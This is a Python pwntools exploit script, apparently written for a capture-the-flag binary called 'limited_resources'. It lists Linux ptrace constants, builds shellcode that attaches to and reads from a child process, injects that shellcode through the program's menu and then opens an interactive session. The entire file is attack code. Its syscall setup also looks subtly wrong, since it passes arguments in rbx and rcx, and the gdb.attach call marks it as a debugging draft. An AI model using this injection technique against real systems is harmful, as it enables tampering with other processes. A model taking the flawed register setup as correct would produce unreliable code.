#!/usr/bin/env python3

from pwn import *

PTRACE_TRACEME = 0x0
PTRACE_PEEKTEXT = 0x1
PTRACE_PEEKDATA = 0x2
PTRACE_PEEKUSER = 0x3
PTRACE_POKETEXT = 0x4
PTRACE_POKEDATA = 0x5
PTRACE_POKEUSER = 0x6
PTRACE_CONT = 0x7
PTRACE_KILL = 0x8
PTRACE_SINGLESTEP = 0x9
PTRACE_GETREGS = 0xc
PTRACE_SETREGS = 0xd
PTRACE_GETFPREGS = 0xe
PTRACE_SETFPREGS = 0xf
PTRACE_ATTACH = 0x10
PTRACE_DETACH = 0x11
PTRACE_GETFPXREGS = 0x12
PTRACE_SETFPXREGS = 0x13
PTRACE_SYSCALL = 0x18
PTRACE_GET_THREAD_AREA = 0x19
PTRACE_SET_THREAD_AREA = 0x1a
PTRACE_ARCH_PRCTL = 0x1e
PTRACE_SYSEMU = 0x1f
PTRACE_SYSEMU_SINGLESTEP = 0x20
PTRACE_SINGLEBLOCK = 0x21
PTRACE_SETOPTIONS = 0x4200
PTRACE_GETEVENTMSG = 0x4201
PTRACE_GETSIGINFO = 0x4202
PTRACE_SETSIGINFO = 0x4203
PTRACE_GETREGSET = 0x4204
PTRACE_SETREGSET = 0x4205
PTRACE_SEIZE = 0x4206
PTRACE_INTERRUPT = 0x4207
PTRACE_LISTEN = 0x4208
PTRACE_PEEKSIGINFO = 0x4209
PTRACE_GETSIGMASK = 0x420a
PTRACE_SETSIGMASK = 0x420b
PTRACE_SECCOMP_GET_FILTER = 0x420c
PTRACE_SECCOMP_GET_METADATA = 0x420d
PTRACE_GET_SYSCALL_INFO = 0x420e


def ptrace_call(request, pid, addr, data):
    sc = shellcraft.amd64.mov("rax", 0x65) #load in the syscall number
    sc += shellcraft.amd64.mov("rdi", request)
    sc += shellcraft.amd64.mov("rsi", pid)
    sc += shellcraft.amd64.mov("rbx", addr)
    sc += shellcraft.amd64.mov("rcx", data)
    sc += '\tsyscall\n'
    return sc

r = process("./limited_resources")
r.sendlineafter("xit\n", '2')
r.recvuntil("= ")
pid = int(r.recvline().strip())

sc = ptrace_call(PTRACE_ATTACH, pid, 0, 0)
sc += ptrace_call(PTRACE_PEEKUSER, pid, 0x8, 0)

r.sendlineafter("xit\n", '1')
r.sendlineafter("?\n", '1000')
r.sendlineafter("?\n", '7')
print(sc)
r.sendlineafter("?\n", asm(sc, vma=0x400000, arch='amd64', os='linux'))

r.recvuntil("at 0x")
address = int(r.recvline().strip(),16)
gdb.attach(r)

r.sendlineafter("xit\n", '3')
r.sendlineafter("?\n", f'{hex(address)}')

r.interactive()

